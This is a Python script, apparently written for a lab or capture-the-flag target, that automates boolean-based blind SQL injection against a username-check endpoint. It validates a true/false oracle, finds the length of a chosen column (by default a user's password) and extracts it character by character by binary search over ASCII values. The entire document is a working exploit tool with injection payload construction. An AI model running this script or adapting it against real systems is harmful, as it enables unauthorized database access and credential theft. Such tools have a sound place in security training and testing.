#!/usr/bin/python3

import argparse
import json
import requests
import sys
import time
from urllib.parse import quote_plus


# ── Pretty printing ──────────────────────────────────────────
# Status goes to stderr so stdout only has the extracted value.
# Colors auto-disable when stderr is piped to a file.

USE_COLOR = sys.stderr.isatty()


def colorize(code, text):
    if USE_COLOR:
        return f"\033[{code}m{text}\033[0m"
    return text


def info(message):
    print(colorize("1;34", f"[*] {message}"), file=sys.stderr)


def success(message):
    print(colorize("1;32", f"[+] {message}"), file=sys.stderr)


def error(message):
    print(colorize("1;31", f"[-] {message}"), file=sys.stderr)
    sys.exit(1)


def print_banner(title):
    line = "=" * 50
    print(colorize("1;35", line), file=sys.stderr)
    print(colorize("1;35", f"  {title}"), file=sys.stderr)
    print(colorize("1;35", line), file=sys.stderr)


# ── CLI arguments ────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="Boolean-based blind SQLi via bisection"
    )
    parser.add_argument("-u", "--url",
                        default="http://10.129.204.197/api/check-username.php",
                        help="Target URL")
    parser.add_argument("-t", "--target",
                        default="maria",
                        help="Username to target")
    parser.add_argument("-q", "--query",
                        default="password",
                        help="Column to extract")
    return parser.parse_args()


# ── Extraction logic (oracle-agnostic) ───────────────────────

def validate_oracle(oracle):
    """Send two known queries to make sure the oracle works."""
    info("Validating oracle...")

    if not oracle("1=1"):
        error("Oracle check failed: 1=1 returned FALSE")

    if oracle("1=0"):
        error("Oracle check failed: 1=0 returned TRUE")

    success("Oracle OK: 1=1 -> TRUE, 1=0 -> FALSE")


def find_length(oracle, column, max_length=128):
    """Try every length from 0 to max_length until we find a match."""
    info("Detecting length...")

    for length in range(max_length):
        # Overwrite the same line so we get a live counter
        print(
            colorize("1;34", f"\r[*] Testing length = {length}"),
            end="",
            file=sys.stderr,
        )

        if oracle(f"LEN({column})={length}"):
            print(file=sys.stderr)  # finish the \r line
            success(f"Length = {length}")
            return length

    print(file=sys.stderr)
    error(f"Length not found (tested up to {max_length})")


def extract_bisection(oracle, column, length):
    """
    Extract each character using binary search on its ASCII value.
    Prints each character to stdout as it's found, so you can
    watch the value build up in real time.
    """
    result = ""

    for position in range(1, length + 1):
        low = 0
        high = 127

        # Binary search: narrow down the ASCII value
        while low <= high:
            mid = (low + high) // 2
            query = f"ASCII(SUBSTRING({column},{position},1)) BETWEEN {low} AND {mid}"

            if oracle(query):
                high = mid - 1
            else:
                low = mid + 1

        character = chr(low)
        result += character

        # Show the character on stdout (for piping)
        print(character, end="", flush=True)

        # Show progress on stderr
        print(
            colorize("1;34", f"\r[*] Extracting [{position}/{length}] {result}"),
            end="",
            file=sys.stderr,
        )

    print(file=sys.stderr)  # finish the \r line
    print()                  # finish the stdout line
    return result


# ── Main ─────────────────────────────────────────────────────

def main():
    args = parse_args()

    print_banner("Boolean-Based Blind SQLi (Bisection)")
    info(f"Target: {args.target}")
    info(f"URL:    {args.url}")
    info(f"Query:  {args.query}")
    print(file=sys.stderr)

    # Track how many HTTP requests we send
    request_count = 0
    start_time = time.time()

    # ── Build the oracle ──
    # The oracle sends the SQL condition to the server and returns
    # True/False based on the JSON response. The extraction functions
    # above don't know anything about HTTP — they just call oracle(q).
    def oracle(condition):
        nonlocal request_count
        request_count += 1

        payload = quote_plus(f"{args.target}' AND ({condition})-- -")
        response = requests.get(f"{args.url}?u={payload}")
        data = json.loads(response.text)

        return data["status"] == "taken"

    # ── Run ──
    validate_oracle(oracle)

    length = find_length(oracle, args.query)
    result = extract_bisection(oracle, args.query, length)

    elapsed = time.time() - start_time
    print(file=sys.stderr)
    success(f"Result: {result}")
    success(f"Done in {elapsed:.1f}s ({request_count} requests)")


if __name__ == "__main__":
    main()
